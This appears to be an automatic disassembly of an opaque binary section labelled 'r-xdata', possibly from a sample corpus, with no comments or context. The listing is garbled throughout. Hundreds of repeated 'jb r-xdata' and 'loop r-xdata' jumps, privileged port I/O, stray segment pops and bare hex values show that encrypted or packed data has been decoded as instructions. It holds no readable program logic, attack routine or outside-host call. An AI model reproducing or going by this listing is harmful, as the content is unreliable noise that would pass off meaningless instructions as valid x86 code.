loop r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x51 ] ch
sbb al 0xbb
imul ebp [ edx ] 0x1eaf6b84
jb r-xdata
adc al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push es
imul esp [ 0x1d009b0a ] 0x22d1bb1d
or ebp [ ebx ]
in al dx
loop r-xdata
loop r-xdata
loop r-xdata
inc edx
sub al 0x1d
sbb eax 0xdfee2661
or [ eax ] 0xe2
shl [ edx ] 0x1
imul esi [ edi - 0x7f77477e ] 0xffffff84
jb r-xdata
sbb eax 0xbb51297
xchg esp eax
in al 0xe2
jb r-xdata
test [ ecx + 0x32 ] ch
jb r-xdata
xchg edx eax
mov bh 0x84
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
outsd
adc [ 0x7272721d ] ebx
jb r-xdata
and ah [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x1d3b680b
sbb ebx ebp
or esi [ ebp + 0x72e2e2f2 ]
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
sbb eax 0xf6280b1d
jb r-xdata
and [ edx + 0x72 ] esi
bound ebp [ eax ]
sbb eax 0x2267bb1d
in eax dx
mov [ 0x1d3c ] al
sbb eax 0xb2bea76f
or eax ebp
cmp al 0x1d
sbb eax 0x72727272
jb r-xdata
mov cl 0xb1
jb r-xdata
test [ ebx - 0x51 ] ch
mov ebx 0x50bf6b84
jb r-xdata
jb r-xdata
push edx
jb r-xdata
jb r-xdata
sbb eax 0xed72721d
mov bh 0xb
mov cl 0xb
pop edi
xor [ 0x1a61721d ] ebx
jecxz r-xdata
sbb eax 0xa70b0697
jb r-xdata
jb r-xdata
jb r-xdata
enter 0x1d24 0x1d
popad
mov edi 0x1ac60be8
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
or ecx edi
or bl [ 0x741db21d ]
dec esi
jb r-xdata
jb r-xdata
adc ebx [ 0xffffffff8ae6881d ]
mov ah 0x82
outsd
or ecx [ edi ]
pop ss
sbb eax 0x6469721d
popad
fild [ edx + 0xbe2e208 ]
push ebx
cmp al 0x1d
sbb eax 0x72727272
out dx al
jb r-xdata
push cs
popad
push cs
mov [ ebx - 0x7b6b7746 ] al
imul esp [ edi - 0x37f445ee ] 0x12
sbb eax 0x8872721d
retn 0xd80b
jl r-xdata
loop r-xdata
jb r-xdata
or eax 0x850b0fbd
loopne r-xdata
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edx + esi * 4 + 0x1d18610a ] 0x1d
or eax [ eax + 0x5be2e2d7 ]
imul esp [ edi - 0x387745f8 ] 0xffffff84
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x3d7745f4 ] 0xffffff84
imul esp [ edi - 0x13b6f4ee ] 0xffffffe2
loop r-xdata
jb r-xdata
mov ch 0x6b
pop esp
loop r-xdata
cmp [ ecx + 0x5f ] ecx
jb r-xdata
in eax dx
jb r-xdata
xchg edi eax
sbb al 0x84
jb r-xdata
and al 0xa
jb r-xdata
loop r-xdata
in eax dx
cmp [ eax + 0x6b848088 ] 0xb7
jb r-xdata
sbb eax 0xa7698ab4
shl [ edx ] 0x1
loop r-xdata
cmpsd [ esi ] [ edi ]
push ds
fldenv [ ecx ]
or esp esp
test [ ebx + ebp * 2 - 0x68967569 ] 0x9e
xor dl cl
jb r-xdata
imul esi [ edx ] 0x6b8422d1
jb r-xdata
sbb eax 0x4180b1d
sbb eax 0xa725721d
call 0x6f62e593
outsd
sub bl [ edi ]
imul ebx [ ebx ] 0x209f6b84
imul ebx [ esp + eax * 4 ] 0x88269f6b
mov ah 0xb
push ebx
sbb eax 0x7272721d
mov bh 0x69
push cs
mov bl 0xb
sub [ ebx ] ecx
mov esp 0x72212bb9
jb r-xdata
push cs
pop ds
sbb eax 0x800bb21d
int1
loop r-xdata
sbb eax 0x6f727272
jb r-xdata
mov ah bh
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
or dl ah
mov dl 0xb1
jb r-xdata
sahf
outsd
push es
rcl [ ecx + ebp * 2 ] 0x1
sub al 0xb
sub al dh
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + edi + 0x1d ]
sbb eax 0x72727272
xchg [ 0x7c0beab5 ] bl
mov dl al
shl [ edx ] 0x1
mov dh dh
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
cmp bh [ ebx + 0x50bf6b84 ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x971db21d
mov bl 0x28
jb r-xdata
jb r-xdata
and bh [ ebx + ebp + 0x72727221 ]
jb r-xdata
jb r-xdata
or eax esi
jb r-xdata
jb r-xdata
or al [ edx + 0x2c ]
sbb eax 0xee26611d
fild [ edx - 0x121d1df8 ]
loop r-xdata
sbb eax 0xed1a9fdb
jb r-xdata
jb r-xdata
jno r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
loop r-xdata
push ds
sbb eax 0xe90bb21d
cmp ecx esi
loop r-xdata
or [ edx + 0x6b84c788 ] bh
cmpsd [ esi ] [ edi ]
push cs
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov dl al
test [ ebx - 0x59 ] ch
adc cl [ ebx ]
dec ecx
in al dx
test [ ebx - 0x59 ] ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
mov dl 0xa
popad
sbb [ 0xffffffffd7800b1d ] bl
loop r-xdata
pop edi
jb r-xdata
loop r-xdata
push 0xffffffcf
jb r-xdata
add bl [ 0xffffffffb21d881d ]
or ebp [ ebx ]
loop r-xdata
imul ebx [ edi + 0xb1a6914 ] 0x2b
jb r-xdata
mov al ah
or ebx ebp
adc eax 0x72721d1d
sbb eax 0x109f6b84
imul ebx [ ebx ] 0x169f6b84
jb r-xdata
mov [ ebx + ebp * 2 + 0x326984b7 ] es
mov [ eax - 0x7f48947c ] al
jb r-xdata
call sub_45e591
sbb eax 0x1f2a6f6f
jb r-xdata
jb r-xdata
jb r-xdata
and al [ ebx + ebp * 2 - 0x58906d59 ]
jb r-xdata
jb r-xdata
out 0xe2 al
jb r-xdata
loop r-xdata
out dx al
fldenv [ ecx ]
sub ah al
mov dl 0x6f
jb r-xdata
or edi [ edi + 0x72e2e2f8 ]
sahf
adc ch ch
pushad
hlt
sbb eax 0x72727272
in eax dx
cmp [ eax - 0x7948947c ] 0x88
test [ eax - 0x7358947c ] edi
jb r-xdata
jb r-xdata
sbb eax 0x530b0697
jb r-xdata
jb r-xdata
sbb eax 0x1dd1eab4
or ebp [ 0x721d1d0e ]
jb r-xdata
mov [ esp + eax * 4 - 0x45c95895 ] cl
mov [ esi + 0x34a76b84 ] dl
shl [ edx ] 0x1
or edi [ esi ]
cmp [ 0x7272721d ] bl
jl r-xdata
mov dl 0x69
and al 0xa
cli
mov cl 0xb1
mov cl 0xb1
outsd
loop r-xdata
loopne r-xdata
sbb eax 0x7c0beab5
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
sub [ 0xffffffffb5b5b51d ] bl
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb bl [ 0x7272721d ]
sbb eax 0x37220baa
test [ ebx - 0x49 ] ch
mov eax 0x1d044d0b
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ si ] [ di ]
lahf
jb r-xdata
jb r-xdata
sbb eax 0x1e971d1d
cmp ebp ebp
fist [ ebx ]
scasb [ edi ]
add ebx [ 0x1d72721d ]
mov ch 0x1d
je r-xdata
adc ebx [ 0x1e971d1d ]
mov cl 0xb
fstp [ esi ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
add bl [ 0x3aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
pop eax
test [ ebx - 0x59 ] ch
push ss
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
jb r-xdata
mov ah 0xb5
imul ebx [ edx ] 0x6e0b39d1
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbe2e2e2
pop ebx
push cs
loop r-xdata
sbb cl [ ebx ]
adc al 0x69
jb r-xdata
imul ebx [ esp + eax * 4 ] 0x69149f6b
imul ebx [ edi - 0x7be496f0 ] 0x6b
lahf
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
mov ch [ ecx - 0x59 ]
sbb eax [ ebx + ebp * 2 + 0x1c69209f ]
imul ebx [ ebx ] 0xede31d61
jb r-xdata
popad
jb r-xdata
imul esp [ edi - 0x958906e ] 0xffffff84
imul edx [ edi - 0x61689676 ] 0xb
mov edi 0x72e2e2f8
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
cmpsd [ esi ] [ edi ]
pop edx
scasd [ edi ]
scasd [ edi ]
mov edx 0x5ea72587
mov dl 0x1d
loop r-xdata
jb r-xdata
loop r-xdata
leave
jb r-xdata
sbb eax 0x2fd90b1d
sbb eax 0x7272721d
or esi ebp
out 0xe2 al
loop r-xdata
imul ecx [ esi ] 0xb290bb3
xchg [ eax + 0x6b84b885 ] cl
cmpsd [ esi ] [ edi ]
test [ ebx - 0x49 ] ch
or bh [ edi + 0x3 ]
or edx [ ebx ]
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
mov cl 0x88
retn 0xb1b1
loop r-xdata
loop r-xdata
or dl ah
jb r-xdata
0xe2e07c0b 0x72e2
jb r-xdata
imul ebp [ edi + 0xb8b8824 ] 0xffffffe2
stc
jb r-xdata
jb r-xdata
mov edi 0xaf6b8450
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov dl 0x69
cmpsd [ esi ] [ edi ]
sbb ch [ ecx + 0x62 ]
inc esi
loop r-xdata
mov dl 0x1d
jb r-xdata
or cl al
and al 0x1d
sbb eax 0xbee2661
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + ebp * 8 - 0x1e ]
loop r-xdata
imul ebp esi 0xfffffff4
or ebx [ edi + 0x721d1d16 ]
in eax dx
push ss
shl edx 0x1
loop r-xdata
loop r-xdata
sbb eax 0xd6e90bb2
mov cl 0x6f
jb r-xdata
in eax dx
jb r-xdata

sbb ah [ edi + 0x1d ]
in eax dx

mov ch 0x69
sbb dl cl
cmp [ ebx ] ecx
outsb
jb r-xdata
loop r-xdata
test eax esp
mov ebp 0xe0850b0f
sub ebx [ eax ]
sbb eax 0xdb88a1d
imul ecx [ esi ] 0xb1ee0e61
mov ch 0xb
sbb eax 0x1a9fdb1d
in eax dx
jb r-xdata
jb r-xdata
int 0xd5
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x1ab76b16 ] 0x69
jb r-xdata
outsd
jb r-xdata
scasd [ edi ]
jb r-xdata
mov eax [ edi - 0x79e558db ]
jb r-xdata
aad 0xe2
mov dl 0x6f
popad
out dx al
sub ebp ebp
jb r-xdata
push ss
adc [ ecx + 0x1b ] ch
test [ ebx - 0x61 ] ch
jb r-xdata
mov eax 0x86b76b84
mov bh 0x80
jb r-xdata
jb r-xdata
fistp [ edi - 0x598120a ]
loop r-xdata
cli
loop r-xdata
popad
jb r-xdata
mov [ es : ebx + ecx + 0x1d1d3653 ] dh
lahf
loop r-xdata
xchg edi eax
adc dh [ ebp - 0x1d1b6bf5 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x1d04180b
sbb eax 0x56a72572
mov ecx 0xe2e067ed
jb r-xdata
sbb eax 0xb72721d
jb r-xdata
sbb eax 0x9367ede3
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
sbb ch [ ecx + 0x3c ]
test [ ebx - 0x41 ] ch
sbb [ ecx + 0x3a ] ch
or ebp ebp
inc edx
pop ds
sbb eax 0xb51db21d
mov dl 0xb1
sbb eax 0xe2e24e75
loop r-xdata
mov cl 0xb1
mov cl 0x6f
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d231e
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
sbb eax 0xc2887272
or ebx eax
mov ebp 0x72727221
jb r-xdata
bound ebx [ bx ]
jb r-xdata
or edx [ eax + 0x72e2e2c2 ]
jb r-xdata
xor eax 0xa4e2e2d4
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x88f20e61
cmp [ edx + 0x6b849488 ] 0xffffffa7
adc bh [ edx + 0x1d12c80b ]
or [ 0xb22d11d ] ebx
mov [ 0x721d1d09 ] eax
jb r-xdata
fistp [ edi - 0x589812e6 ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
mov dl 0xb
jmp 0x73288b13
outsd
push ss
jb r-xdata
loop r-xdata
in eax dx
sbb eax 0xff180b1d
loop r-xdata
sub bl [ edi ]
jb r-xdata
mov ah 0xce
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
jb r-xdata
and eax 0x8e861aa7
jb r-xdata
imul esp [ esi + edx * 8 - 0x1d168ef5 ] 0x727272e2
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x180f0b1d
or ecx [ esi + 0x37 ]
sbb eax 0x3b69721d
mov [ ecx + 0x4ebf6b84 ] al
mov ecx 0x4cbf6b84
mov [ ecx + 0x5caf6b84 ] dl
mov ebx 0x6b849688
scasd [ edi ]
and [ ebx + 0x6b849788 ] bh
sub eax [ edx ]
loop r-xdata
jb r-xdata
sbb eax [ ebx + ebp * 2 + 0x1c69169f ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2bd186b4
loop r-xdata
jecxz r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
outsd
jb r-xdata
popad
cdq
adc eax 0x7272213a
jb r-xdata
mov ah 0xea
popad
sbb bl [ 0x692377ed ]
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
loop r-xdata
in eax dx
xchg ebx eax
in eax dx
mov [ edx + 0x1d05950b ] ah
jg r-xdata
and ebp [ ecx + 0x1b ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edi 0xe0050a12
loop r-xdata
sbb eax 0x32676f1d
pop ds
sbb eax 0x1db1b21d
mov ch 0xf6
imul edx [ edi + 0x32 ] 0x1f
out 0x19 al
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
and [ 0x22d1721d ] ebx
jb r-xdata
sbb eax 0x370bb41d
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fst [ 0x72721d1d ]
loopne r-xdata
jb r-xdata
or esi [ esi ]
clc
loop r-xdata
mov [ eax + 0x6b843c69 ] dl
mov edi 0xd2800bb0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ebp [ ebx ]
and [ edx + 0x72 ] esi
mov esp 0x72e2e2c1
jb r-xdata
out dx al
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
hlt
test [ ecx - 0x26 ] ah
loop r-xdata
sbb eax 0x740bb21d
in al dx
pop ds
jb r-xdata
or edi [ edi - 0x1e ]
or edx [ edi + 0xa721d1d ]
arpl cx di
loop r-xdata
loop r-xdata
and ebp ebp
sbb ch ch
mov cl 0xb1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bh 0x1a
jb r-xdata
cmpsd [ esi ] [ edi ]
xor ah ch
loop r-xdata
sbb eax 0x676feab4
pop esi
sbb [ 0xffffffffb41db21d ] bl
shl [ edx ] 0x1
mov [ 0xffffffffe2fa270b ] al
mul edx
loop r-xdata
xchg edi eax
push cs
push ds
sbb ch [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esi [ edi + 0x6b84b802 ] 0xffffffb7
add cl dl
xor [ ebx ] cl
xchg edx eax
cli
loop r-xdata
salc
jb r-xdata
cmc
loop r-xdata
and ch ch
0x88e2e2e2 0x1de2
sbb eax 0xb21d881d
jb r-xdata
imul ebx [ edi - 0x7be396ea ] 0x6b
lahf
jb r-xdata
push esi
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub bl [ bx ]
sbb eax 0x950bbb72
cmp al 0x1d
sbb eax 0xd6941d72
or esp [ esi - 0x10 ]
mov [ 0x1d05950b ] al
test [ ebx - 0x69 ] ch
mov ch [ ecx - 0x69 ]
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
sub ebx [ 0x3b680b1d ]
sbb eax 0x7272721d
or ebp [ esi + 0x13 ]
sbb eax 0x7272721d
sub dh dh
sbb esp [ ecx + 0x1d ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
and al 0xb
push ds
and ebx [ 0x7272721d ]
jb r-xdata
aaa
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
cdq
and [ 0x180f0b1d ] ebx
push edi
xor bl [ edi ]
sbb eax 0xa90bb694
add al 0x1d
out 0x19 al
jb r-xdata
loop r-xdata
test [ ebx - 0x49 ] ch
push es
mov eax 0x1d0fe50b
sbb eax 0x72727272
outsd
jb r-xdata
test [ ebx - 0x61 ] ch
loop r-xdata
sub ebp ebp
jb r-xdata
loop r-xdata
sbb eax 0x4e741db2
jb r-xdata
imul esp [ edi - 0x6e7745fe ] 0xffffff84
imul esp [ edi - 0x20f44600 ] 0xffffffec
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbb0bf6b
jb r-xdata
or bh cl
cli
jb r-xdata
mov ebx 0xe2ff770b
loop r-xdata
jb r-xdata
salc
popad
mov ch 0xa
xchg [ 0xffffffff8e861aa7 ] esp
jb r-xdata
loop r-xdata
imul edx [ edx ] 0xe2d5cd0b
loop r-xdata
sbb eax 0xec740bb2
pop ss
fldenv [ ecx ]
in eax dx
and al 0xca
jb r-xdata
loop r-xdata
or esi edx
call 0x6e5189b6
cmp eax 0x72721d1d
jb r-xdata
outsd
jb r-xdata
or esi [ ecx - 0x17 ]
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
0x1f9e676f 0x1d1d
loop r-xdata
jb r-xdata
or esi [ edi - 0x1 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jmp 0x72b88c03
loop r-xdata
jb r-xdata
jno r-xdata
jb r-xdata
mov [ 0xbe088b2 ] bl
sbb eax 0xb41db21d
xchg [ ecx + 0x2a ] ah
loopne r-xdata
pop ds
mov [ 0xffffffffb166ede2 ] al
pop ds
sbb eax 0x8ae2881d
adc edi edi
mov esp [ edx - 0x1d0523f5 ]
loop r-xdata
sbb eax 0x9961eab4
jb r-xdata
sub bl [ bx ]
sbb eax 0xb41db21d
outsd
push ebp
test [ ebx - 0xe ] ch
test [ edi + 0x30 ] ah
in eax dx
pop ds
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
or ebp [ esi ]
or ebx [ 0x7272721d ]
mov [ ebx - 0x40947b47 ] cl
push ss
imul edi [ 0x14bf6b84 ] 0x6b843a69
mov edi 0x843c691a
imul edi [ edi + 0xb3a6918 ] 0xffffffed
jb r-xdata
jb r-xdata
push ebp
not [ ebx + 0x1d21940b ]
sbb eax 0x72727272
jb r-xdata
jb r-xdata
sbb eax 0xa7611aa7
jb r-xdata
jb r-xdata
jb r-xdata
lodsb [ esi ]
cli
loop r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xae
or eax eax
add [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
outsd
test [ ebx - 0x49 ] ch
sub ch [ ecx + 0x32 ]
test [ ebx - 0x49 ] ch
mov ch 0x6f
adc dl 0xe2
test [ ebx - 0x41 ] ch
mov al 0xb
mov dl 0x6b
mov edi 0xe3b20b1e
loop r-xdata
sbb eax 0xceb41db2
jb r-xdata
loop r-xdata
jb r-xdata
inc eax
or al [ ebp + 0x611d1d3c ]
out dx al
ja r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb al [ esi + 0xbcc8e8e ]
add ecx [ edx ]
sbb eax 0xb2b3721d
test [ ebx - 0x49 ] ch
add bh [ eax + 0xb76b84 ]
shl [ eax ] 0x1
or edx [ edx + 0x72e2e2fa ]
jb r-xdata
jne r-xdata
jb r-xdata
jb r-xdata
dec ebp
salc
out dx al
jb r-xdata
bound ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
test [ es : ebx ] 0x2b
aad 0xe2
loop r-xdata
mov dl dh
outsd
cmpsd [ esi ] [ edi ]
push es
mov cl 0xb
pop ecx
jmp r-xdata
mov dl 0xa
test [ ebx - 0x11d99ee3 ] edi
imul esp [ edi + 0x1aa76906 ] 0x6b
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
imul edx [ edi + 0x6ae468ea ] 0x30d1dbe6
imul esp [ ebx ] 0x1d5fa80b
sbb eax 0x35840a72
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
mov ebp 0x6b84a088
lahf
push edx
mov ebp 0x509f6b84
sbb eax 0x1d3fe30b
sbb eax 0xd1727272
sbb eax 0x1e9f6b84
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2e3e68a
loop r-xdata
push ds
0xbbbb
push ebp
movsb [ edi ] [ esi ]
in al 0x1d
add ah dh
loop r-xdata
popad
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb ah [ ecx - 0x59 ]
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ esp + eax * 4 + 0xb06b76b ] cl
outsd
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
sbb [ eax + 0x1e6c0b80 ] cl
jb r-xdata
nop
or esp [ edi ]
and [ edx + 0x72 ] esi
sbb eax 0x72727272
mov ah dl
loop r-xdata
mov bh 0x10
mov eax 0x6b848e88
outsd
sub dx di
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jmp edx
loop r-xdata
jb r-xdata
imul esp [ edi + 0x16a725ea ] 0x878b8091
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
xchg edi eax
sbb eax 0xe2e21675
loop r-xdata
jb r-xdata

jb r-xdata
jb r-xdata
jb r-xdata
daa
jb r-xdata
push es
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ecx [ edx + 0x205260ed ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsb
adc ebx [ 0x7272721d ]
pop sp
imul esi edx 0xffffff84
xor ch ch
jb r-xdata
jb r-xdata
call 0xffffffffa70fa9c3
aaa
jb r-xdata
sbb al [ ebx + ebp * 2 - 0x5890f351 ]
and dl cl
sub esi [ ebx + ecx + 0x1d1d3c74 ]
jb r-xdata
and cl [ eax - 0x58947b0a ]
and ch ch
dec bx
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg edi eax
push ss
or esp ebp
or eax 0x72721d1d
sbb eax 0x72212b1d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esi [ edx ] 0x28b76b84
mov [ esi + 0x2ab76b84 ] cl
mov edi 0x6366ed1e
mov ch 0xb
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
0x9116a725 0x8b80
sahf
pop ds
sbb eax 0x530bb21d
iretd
pop edx
jb r-xdata
outsd
loop r-xdata
mov esp 0x72212bb9
jb r-xdata
jb r-xdata
imul esp [ edi + 0xaa76b1a ] 0xb16a769
jb r-xdata
loop r-xdata
cmp al 0x84
imul edi [ edi - 0x2d7ff450 ] 0xffffffe2
jb r-xdata
loop r-xdata
jb r-xdata
or ch [ ecx - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
out dx al
loop r-xdata
jb r-xdata
imul esp [ esi + edi * 8 + 0x1d35380a ] 0x1d
mov ch [ edi ]
jb r-xdata
sbb eax 0xb20ea76f
imul esp [ edx + ecx ] 0x1d1d35b0
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
rcr [ 0x1e9f6b84 ] 0x1
mov bh ch
or bl [ eax + 0x611d1d5d ]
out dx al
jb r-xdata
sbb cl [ edx - 0x1d1d1c1a ]
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x3ca50aaa
sbb eax 0xd6a46b1d
jb r-xdata
mov dl 0xa
jb r-xdata
sub esp [ ecx ]
jb r-xdata
sbb eax 0x4b0b1697
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
loop r-xdata
loop r-xdata
jb r-xdata
lahf
adc al 0x84
imul esi [ edi + 0xb8b88be ] 0xffffffa8
mov cl 0x6f
and ch ch
jb r-xdata
jb r-xdata
mov dl 0x71
jb r-xdata
or dh dl
mov cl 0xb2
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
xchg edi eax
imul edi [ edi - 0x1c4df4e2 ] 0xffffffe2
loop r-xdata
call 0x7262c6dd
imul esp [ edi + 0x16a7690a ] 0xb
jb r-xdata
jb r-xdata
in eax dx
movsb [ edi ] fs : [ esi ]
mov ch 0x6b
movsb [ edi ] [ esi ]
retn 0xea0b
loopne r-xdata
dec [ edx ]
cmp [ 0x2f8a1d1d ] dh
jb r-xdata
sbb eax 0xe2e8130b
loop r-xdata
mov ch [ ebx - 0x4a83ce97 ]
imul esp [ edx + esi * 8 + 0x1d3ae50a ] 0x1d
mov dl 0x69
and al 0xa
mov al 0x35
sbb eax 0xd0bbb1d
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
sub esp [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + ebp * 4 + 0x1d3ca50a ] 0x1d
imul esp [ esi + edx * 8 - 0x7cbbbf76 ] 0x9
jb r-xdata
cmp ebx [ 0x7272721d ]
jb r-xdata
fstp [ esi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
push ss
jb r-xdata
loop r-xdata
mov ch 0x1d
jb r-xdata
sbb eax 0xa340b1d
jb r-xdata
jb r-xdata
stc
or [ ebx + 0x1aa72587 ] 0x86
in eax dx
xchg ecx eax
loop r-xdata
jb r-xdata
imul edi [ edx ] 0x66ed3967
fist [ ebx ]
scasd [ edi ]
test [ edx ] 0x6
loop r-xdata
bound ebp [ ebx - 0x41 ]
sbb eax 0xe2e21a75
out dx al
jb r-xdata
loop r-xdata
mov ecx [ ebx ]
loop r-xdata
mul edx
imul edi [ edi - 0x60947bfc ] 0x14
test [ ebx - 0x49 ] ch
mov esi 0xa80b8b88
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ ecx + 0x72e2e2e7 ]
cmpsd [ esi ] [ edi ]
or bh [ edx + 0x6b848c88 ]
scasd [ edi ]
out dx al
sbb eax 0x40b96b5
in al dx
jb r-xdata
jb r-xdata
imul esp [ edi - 0x184ef500 ] 0xffffffe2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
sub esp [ ecx ]
jb r-xdata
pop esi
loop r-xdata
xchg edi eax
out dx al
in eax dx
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
sbb eax 0xa340b1d
jb r-xdata
or bl bl
jb r-xdata
0xbc16b8a 0xf9e2
jb r-xdata
push cs
dec ebx
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
sbb eax 0x1d0a340b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ ebx - 0x3 ]
loop r-xdata
or bl [ 0xffffffffb2b3721d ]
jb r-xdata
movhps [ 0x6469721d ] xmm3
mov eax 0xe2d8d60b
jb r-xdata
jb r-xdata
mov dl 0xb
loop r-xdata
in eax dx
inc esi
cmp eax 0x22d11d1d
and [ edx + 0x72 ] esi
jb r-xdata
add ebx [ 0xffffffffee26611d ]
jb r-xdata
imul esp [ edi + 0xee80b16 ] 0x72721d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ 0x721d1d1f ]
push ss
cmpsd [ esi ] [ edi ]
jb r-xdata
imul edi [ edi + 0x16af6b1e ] 0x6b
jb r-xdata
cli
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
or ecx [ 0x72e2e2f0 ]
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
outsb
jb r-xdata
sbb eax 0xe2e24272
loop r-xdata
or esp [ esi - 0x3ce2e2ee ]
mov esi 0xfd0bf2c6
sbb eax 0x7272721d
sub esp [ edi + 0x22 ]
in eax dx
jb r-xdata
and [ edx + 0x72 ] esi
stosb [ edi ]
jb r-xdata
fadd st6
jb r-xdata
jb r-xdata
inc ebp
stc
or esi [ edx + ecx ]
or al [ esi + edi + 0x1d ]
sbb eax 0xb1ee2661
mov al ah
